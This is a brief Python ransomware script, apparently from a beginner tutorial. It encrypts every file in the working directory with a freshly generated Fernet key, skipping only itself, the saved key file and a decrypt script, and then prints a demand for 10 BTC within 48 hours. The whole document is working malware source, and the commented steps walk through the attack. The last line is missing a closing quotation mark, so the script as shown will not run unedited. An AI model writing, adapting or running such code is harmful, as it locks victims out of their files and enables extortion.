#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#let's find some files


files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

#next, we are creating an encryption key that we will use to lock up our files.

key = Fernet.generate_key()

#now we are saving that key to a new file named "thekey.key"

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

#now for the fun part, we are using a for loop to go through every file in our list
#and encrypting the file with our new encryption key

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("Give me 10BTC in 48H or I will delete all your files)
